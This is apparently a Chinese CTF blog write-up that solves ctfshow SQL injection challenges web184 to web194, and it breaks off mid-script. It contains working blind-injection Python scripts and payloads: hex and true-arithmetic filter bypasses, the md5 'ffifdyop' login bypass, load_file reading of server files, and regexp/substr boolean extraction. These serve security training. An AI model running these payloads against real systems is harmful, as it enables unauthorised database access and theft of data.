<p>这次倒是过滤了蛮多东西，像where和单引号双引号啥的都给ban了，这里打算用&quot;right join&quot;右连接(其他例如左连接内连接都可)来把两个表连接起来进行查询pass字段，后面的单引号可以用16进制编码绕过</p>
<blockquote>
<p><strong>RIGHT JOIN（右连接）：</strong> 用于获取右表所有记录，即使左表没有对应匹配的记录。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow%    16进制编码后--&gt;   0x63746673686f7725</span><br><span class="line"></span><br><span class="line">post:tableName&#x3D;ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web184/%7D2%5D%28GE%286CK%5B5T%240%7DB__O2HU.png" alt=""><br>
发现可以成功返回数据，改一下脚本继续跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment"># 字符串转16进制</span></span><br><span class="line">    str_16 = binascii.b2a_hex(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">    str_16 = bytes.decode(str_16)</span><br><span class="line">    res = str_16.replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4d223a13-c7d6-4213-9c81-d388a5c26634.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = <span class="string">&quot;0x&quot;</span> + to_hex(flag + j + <span class="string">&quot;%&quot;</span>)</span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;0&#125;&quot;</span>.format(result)&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="web185"><a class="header-anchor" href="#web185">¶</a>web185</h3>
<p>看匹配规则，这次把数字都给全ban了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function waf($str)&#123;</span><br><span class="line">   return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>想到绕过的方法，一个是用true，另一个是用字母。在mysql中，sql语句true为1，true+true=2，所以通过相加，任何字母我们都可以构造出来<br>
把上题脚本改一下，这里用concat来把每个字母连接起来，作用是连接每个参数拼接成字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT CONCAT(&#39;my&#39;, &#39;s&#39;, &#39;ql&#39;);</span><br><span class="line">-&gt; &#39;mysql&#39;</span><br></pre></td></tr></table></figure>
<p>写一个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNum</span>(<span class="params">n</span>):</span></span><br><span class="line">    str = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">            str += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"><span class="comment">#把每一个字符转换成ascii码对应的数值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_str</span>(<span class="params">s</span>):</span></span><br><span class="line">    str=<span class="string">&quot;&quot;</span></span><br><span class="line">    str+=<span class="string">&quot;chr(&quot;</span>+createNum(ord(s[<span class="number">0</span>]))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        str+=<span class="string">&quot;,chr(&quot;</span>+createNum(ord(i))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c0323dfb-fa55-4925-9c61-2e4b8c64e835.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = change_str(flag + j + <span class="string">&quot;%&quot;</span>)</span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;0&#125;))&quot;</span>.format(result)&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="web186"><a class="header-anchor" href="#web186">¶</a>web186</h3>
<p>再上一题基础上多加了几个过滤，但没影响，继续用上一题脚本打通</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNum</span>(<span class="params">n</span>):</span></span><br><span class="line">    str = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">            str += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_str</span>(<span class="params">s</span>):</span></span><br><span class="line">    str=<span class="string">&quot;&quot;</span></span><br><span class="line">    str+=<span class="string">&quot;chr(&quot;</span>+createNum(ord(s[<span class="number">0</span>]))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        str+=<span class="string">&quot;,chr(&quot;</span>+createNum(ord(i))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3044fe6f-042f-49ea-a38c-5806a2404c7f.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = change_str(flag + j + <span class="string">&quot;%&quot;</span>)</span><br><span class="line">        <span class="comment">#print(result)</span></span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;0&#125;))&quot;</span>.format(result)&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="web187"><a class="header-anchor" href="#web187">¶</a>web187</h3>
<p>这次变成登录的了，看返回逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password = md5($_POST[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin可以获得flag</span></span><br><span class="line"><span class="keyword">if</span>($username!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	$ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">   <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显注入点是md5()函数这里，后面用了参数true，返回的是一个16位二进制<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web187/SI%24XF70%249%5D1LXD61%25G6I%7DOS.png" alt=""><br>
而从网上搜集到的有一个字符串<code>ffifdyop</code>很特殊</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> md5(<span class="string">&quot;ffifdyop&quot;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"><span class="string">&#x27;or&#x27;</span><span class="number">6</span>(后面的是不可见字符)</span><br></pre></td></tr></table></figure>
<p>可以看到会返回引号闭合和or并且后面是一些不可见字符，在mysql中进行布尔判断的时候，只要是数字开头就会被当作true，结果也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password&#x3D;&#39;&#39;or true</span><br></pre></td></tr></table></figure>
<p>也就是一个万能密码登录，在返回包中成功拿到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web187/%5B0NGQWFXFE%5DXOKQX~%25R21V9.png" alt=""></p>
<h3 id="web188"><a class="header-anchor" href="#web188">¶</a>web188</h3>
<p>查看一下sql语句和判断逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> $sql = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">&#x27;pass&#x27;</span>]==intval($password))&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">      array_push($ret[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;$flag));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到是通过检索username来列出密码，然后一个弱比较来进行判断，先给出payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;0&amp;password&#x3D;0</span><br></pre></td></tr></table></figure>
<p>以这道题的数据库为例，这个数据库中的用户名都是以字母开头的数据，而以字母开头的数据在和数字比较时，会被强制转换为0，因此就会相等，后面的pass也是一样的道理<br>
但注意，如果有某个数据不是以字母开头，是匹配不成功的，这种情况怎么办，我们可以用<code>||</code>运算符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;1||1&amp;password&#x3D;0</span><br></pre></td></tr></table></figure>
<h3 id="web189"><a class="header-anchor" href="#web189">¶</a>web189</h3>
<p>开局就来个提示，flag在<code>api/index.php</code>中<br>
这次尝试<code>username=0&amp;password=0</code>登录，发现提示密码错误，说明是密码跟上一题不一样了，不是以字母开头的数据。根据提示，flag的位置在一个文件中，可以用<code>load_file</code>来配合<code>regexp</code>来进行盲注</p>
<blockquote>
<p><strong>LOAD_FILE(file_name)：</strong>  读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。</p>
<p><strong>regexp：</strong> mysql中的正则表达式操作符</p>
</blockquote>
<p>容易想到默认路径是<code>/var/www/html/api/index.php</code>，开始写个脚本进行盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/15 22:14</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://e232d7fb-b70d-4123-a740-369d7137c5dd.challenge.ctf.show:8080/api/index.php&quot;</span></span><br><span class="line">all_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;0&#125;&#x27;),0,1)&quot;</span>.format(flag + j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag +=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<h3 id="web190"><a class="header-anchor" href="#web190">¶</a>web190</h3>
<p>查看查询语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;</span><br></pre></td></tr></table></figure>
<p>结合用户名处会返回用户不存在和密码错误两种结果，利用布尔盲注来进行爆破获取flag，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/6/1 21:57</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://e4bfc493-4ed3-4091-99b3-e1770febcde1.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="number">123456</span>&#125;</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> start &lt; end:</span><br><span class="line">        mid = (start + end) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#取表名：payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#取字段名：payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select f1ag from ctfshow_fl0g&quot;</span></span><br><span class="line">        data[<span class="string">&#x27;username&#x27;</span>] = <span class="string">f&quot;admin&#x27; and if(ascii(substr((<span class="subst">&#123;payload&#125;</span>), <span class="subst">&#123;i&#125;</span> , 1)) &gt; <span class="subst">&#123;mid&#125;</span>, 1, 2)=1#&quot;</span></span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            start = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid</span><br><span class="line">    flag = flag + chr(start)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<h3 id="web191"><a class="header-anchor" href="#web191">¶</a>web191</h3>
<p>看到代码中把ascii给过滤了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|into|ascii/i&#x27;</span>, $username))&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">      <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>我们把上题的脚本中的ascii函数换成ord函数就可以，对于单字节处理两者作用一样</p>
<blockquote>
<p>ord()：ord函数返回字符串的第一个字符的ascii值</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/6/2 17:03</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://d0f3a387-5d85-4a5c-a4b8-2267077de55f.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="number">123456</span>&#125;</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> start &lt; end:</span><br><span class="line">        mid = (start + end) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#取表名：payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#取字段名：payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select f1ag from ctfshow_fl0g&quot;</span></span><br><span class="line">        data[<span class="string">&#x27;username&#x27;</span>] = <span class="string">f&quot;admin&#x27; and if(ord(substr((<span class="subst">&#123;payload&#125;</span>), <span class="subst">&#123;i&#125;</span> , 1)) &gt; <span class="subst">&#123;mid&#125;</span>, 1, 2)=1#&quot;</span></span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            start = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid</span><br><span class="line">    flag = flag + chr(start)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<h3 id="web192"><a class="header-anchor" href="#web192">¶</a>web192</h3>
<p>继续看过滤规则</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|into|ascii|ord|hex/i&#x27;</span>, $username))&#123;</span><br><span class="line">        $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这次把ord给ban了，我们使用正则函数去一个个匹配字符，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/6/2 17:03</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://185fcade-247d-4a43-a4fc-5cd023f84184.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">all_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_str:</span><br><span class="line">        payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span></span><br><span class="line">        username_data = <span class="string">f&quot;admin&#x27; and if(substr((<span class="subst">&#123;payload&#125;</span>), <span class="subst">&#123;i&#125;</span>, 1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;), 1, 0)=1#&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: username_data,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<h3 id="web193"><a class="header-anchor" href="#web193">¶</a>web193</h3>
<p>这次增加了过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|into|ascii|ord|hex|substr/i&#x27;</span>, $username))&#123;</span><br><span class="line">       $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">       <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>把substr给ban了，正则没ban，可以用正则来写，代码中的<code>^</code>代表从第一位开始匹配</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/6/11 14:03</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://4c28d2d4-bcae-4e08-9e24-dfa0cb694305.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">all_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-,_&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_str:</span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_flxg&quot;</span></span><br><span class="line">        username_data = <span class="string">&quot;admin&#x27; and if((&#123;0&#125;)regexp(&#x27;^&#123;1&#125;&#x27;), 1, 0)=1#&quot;</span>.format(payload, flag + j)</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: username_data,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<h3 id="web194"><a class="header-anchor" href="#web194">¶</a>web194</h3>
<p>看过滤规则，正则没有被ban</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|into|ascii|ord|hex|substr|char|left|right|substring/i&#x27;</span>, $username))&#123;</span><br><span class="line">        $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>继续上一题脚本打</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/6/11 14:03</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://f5b3fbb4-9069-425e-8bda-7efad1755835.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">all_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-,_&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_str:</span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_flxg&quot;</span></span><br><span class="line">        username_data = <span class="string">&quot;admin&#x27; and if((&#123;0&#125;)regexp(&#x27;^&#123;1&#125;&#x27;), 1, 0)=1#&quot;</span>.format(payload, flag + j)</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: username_data,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span 